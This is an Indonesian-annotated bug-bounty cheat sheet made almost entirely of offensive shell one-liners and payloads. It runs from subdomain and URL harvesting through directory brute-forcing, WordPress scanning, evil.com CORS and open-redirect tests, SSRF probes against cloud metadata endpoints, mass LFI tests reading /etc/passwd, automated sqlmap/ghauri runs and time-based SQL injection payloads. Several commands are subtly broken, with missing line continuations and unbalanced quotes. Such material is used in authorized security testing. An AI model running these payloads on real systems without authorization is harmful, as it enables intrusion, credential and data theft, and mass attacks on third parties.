# Quick Recon Toolkit

## SUBDOMAIN DISCOVERY 

```bash
subfinder -silent -dL wildcards | anew domains.txt
```

```bash
cat wildcards | assetfinder --subs-only | anew domains.txt
```

```bash
chaos -silent -dL wildcards | anew domains.txt
```

```bash
cat wildcards | while read domain; do
  github-subdomains -d "$domain" -raw
done | grep -v 'https://' | grep -v '^\[' | anew domains.txt
```

```bash
cat wildcards | while read domain; do
  curl -s "https://crt.sh/?q=%.$domain&output=json" \
    | grep -v '^<' \
    | jq -r '.[].name_value' 2>/dev/null \
    | sed 's/\*\.//g' \
    | tr ',' '\n' \
    | grep -v '^\*' \
    | grep "\.$domain$"
done | sort -u | anew domains.txt
```


```bash
bbot -t wildcards -p subdomain-enum -o bbot-output
```
> **BBBOT ini akan menghasilkan folder `bbot-output`,dan di dalalmnay ada beberpa file seprti `subdomains.txt`**

Pindahin hasil bbot ke file domains.txt

```bash
find bbot-output -type f -name "subdomains.txt" -exec cat {} \; | anew domains.txt
```


**Dedup**

```bash
sort -u domains.txt -o domains.txt
```

## HTTP Probing & Infrastructure Fingerprinting

```bash
cat domains.txt | httpx -silent -threads 200 \
  -follow-redirects \
  -status-code \
  -title \
  -tech-detect \
  -content-length \
  -web-server \
  -server
  -ip \
  -cname \
  -location \
  -o live_hosts_info.txt
```

**Filter**

```bash
cat live_hosts_info.txt | awk '{print $1}' | sort -u | anew hosts.txt
```

## URL Collection & Analysis

```bash
katana -list hosts.txt -d 5 -jc -kf all | anew urls.txt
```

```bash
cat hosts.txt | waybackurls |  anew urls.txt
```

```bash
cat hosts.txt | hakrawler -d 3 | anew urls.txt
```

```bash
gau --subs < hosts.txt | sort -u | anew urls.txt
```


## Parameter Extraction

```bash
cat urls.txt | grep "=" > params.txt
```

Untuk lebih lengkapnya bisa cek di [sini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/recon/parameter-extraction-and-analys)


## Sensitive File Discovery

### File Extension Filtering

**Filter URLs for common sensitive file extensions**

```bash
cat urls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
```
**Extended regex for sensitive file discovery**

```bash
cat urls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
```

**Google search for sensitive files**

```bash
site:*.target.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

## Hidden Parameter Discovery

```bash
arjun -u https://target.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
```

```bash
arjun -u https://target.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

## Directory & File Bruteforcing

```bash
dirsearch -u https://target.com --full-url --deep-recursive -r
```


```bash
dirsearch -u https://target.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
```


```bash
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://target.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -t 10
```


## WordPress Security Testing

```bash
wpscan --url https://target.com --disable-tls-checks --api-token YOUR_API_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

Untuk lebih lengkap nya cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/wordpress)


## CORS Testing

### Manual CORS Testing

```bash
curl -H "Origin: http://evil.com" -I https://target.com/wp-json/
```

```bash
curl -H "Origin: http://evil.com" -I https://target.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"
```

### Automated CORS Testing

```bash
cat domains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```

```bash
python3 corsy.py -i hosts.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

```bash
corscanner -u https://example.com -d -t 10
```

Untuk lebih lengkapnya bisa cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/vulnerabilities/cors)

## Subdomain Takeover

```bash
cat domains.txt | subjack -t 20 -o results.txt
```


```bash
subzy run --targets hosts --concurrency 100 --hide_fails --verify_ssl
```
Untuk lebih lengkapnya bisa cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/vulnerabilities/subdomain-takeover)

## Git Repository Disclosure

```bash
cat domains.txt | grep "SUCCESS" | gf urls | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

```bash
cat hosts.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

## SSRF Testing

### SSRF Parameter Discovery

**Identify URLs with SSRF-prone parameters**

```bash
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
```

**Find API endpoints and webhook integrations**

```bash
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u
```

### SSRF Testing

**Automated SSRF vulnerability scanning**

```bash
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
```

**Basic SSRF test to localhost**

```bash
curl "https://target.com/page?url=http://127.0.0.1:80/"
```

**Test SSRF against cloud metadata services**

```bash
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```

Untuk lebih lengkapnya bis cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/vulnerabilities/ssrf)

## Open Redirect Testing

### Parameter Discovery

```bash
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=" | tee redirect_params.txt
```

```bash
cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt
```

### Testing

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

```bash
subfinder -d target.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

bisa juga cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/vulnerabilities/open-redirect/open-redirect) 

## LFI Testing

**LFI testing with FFUF and passwd file detection**

```bash
echo "https://target.com/" | gau --providers wayback,commoncrawl,otx,urlscan | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

**LFI testing with curl and parallel processing**

```bash
gau --providers wayback,commoncrawl,otx,urlscan target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

**LFI testing with httpx**

```bash
echo 'https://target.com/index.php?page=' | httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```

## Additional Tools

### Content Type Filtering

```bash
echo target.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```

```bash
echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

### Miscellaneous

```bash
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file.txt
```

```bash
cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
```

```bash
cat output.txt | sed 's/=.*/=/' > final.txt
```

```bash
cat urls.txt | uro | sort -u > deduplicated_urls.txt
```

```bash
cat urls.txt | qsreplace "FUZZ" | sort -u > fuzz_urls.txt
```

## SQL Injection Methodology

### Endpoint Discovery

**Single domain reconnaissance for potential SQL injectable endpoints**

```bash
subfinder -d target.com -all -silent | httpx -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

**Multiple subdomain reconnaissance for SQL injection testing**

```bash
subfinder -d -l subdomains.txt -all -silent | httpx -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

**Discover potential SQL injectable parameters using gau**

```bash
echo https://target.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
```

**Alternative method for finding SQL injectable endpoints using katana**

```bash
echo https://target.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'
```

**Mass SQL injection testing using ghauri**

```bash
subfinder -d target.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
```

**Comprehensive SQL injection testing using sqlmap**

```bash
subfinder -d target.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
```

### Header-Based Injection

**Testing for time-based SQL injection via User-Agent header**

```bash
curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://target.com'
```

**Testing for time-based SQL injection via X-Forwarded-For header**

```bash
curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://target.com'
```

**Testing for time-based SQL injection via Referer header**

```bash
curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://target.com'
```

**Alternative User-Agent based SQL injection test**

```bash
curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://target.com'
```

**User-Agent header-based MySQL time-based injection**

```bash
curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://target.com'
```

**X-Forwarded-For header-based MySQL time-based injection**

```bash
curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://target.com'
```

**Referer header-based MySQL time-based injection**

```bash
curl -H 'Referer: https://target.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://target.com'
```

### Database-Specific Payloads

**Oracle database time-based injection payload**

```bash
SELECT dbms_pipe.receive_message(('a'),10) FROM dual
```

**Microsoft SQL Server time-based injection payload**

```bash
WAITFOR DELAY '0:0:10'
```

**PostgreSQL time-based injection payload**

```bash
SELECT pg_sleep(10)
```

**MySQL time-based injection payload**

```bash
SELECT sleep(10)
```

### Advanced Payloads

**MySQL alternative time-based payload with URL encoding**

```bash
0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
```

**PostgreSQL complex time-based injection payload**

```bash
'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
```

**MySQL multi-condition time-based payload with comment bypass**

```bash
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/
```

**Combined MySQL and MSSQL time-based payload**

```bash
1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--
```

**Parameter-based MySQL time injection test**

```bash
paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1
```
